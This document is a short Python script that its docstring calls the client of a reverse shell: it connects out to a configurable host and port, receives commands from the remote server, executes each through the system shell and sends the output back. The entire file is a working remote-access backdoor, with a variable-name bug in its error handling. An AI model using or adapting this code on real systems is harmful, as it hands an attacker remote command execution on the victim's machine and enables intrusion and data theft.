''' Meant for the client in a reverse shell connection '''

import socket
import subprocess

# You must change the listening IP and port to match that of the server. 
HOST = '0.0.0.0'
PORT = 87

s = socket.socket()

s.connect((HOST, PORT))
msg = s.recv(1024)
print('Server', msg)

while True:
    cmd = s.recv(1024).decode()
    print(f'[*] receive {cmd}')
    if cmd.lower() in ['q', 'quit', 'x', 'exit']:
        break
    
    try:
        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        results = str(e).encode()
    
    if len(result) == 0:
        result = 'OK'.encode()

    print(len(result), result)
    s.send(result)

s.close()
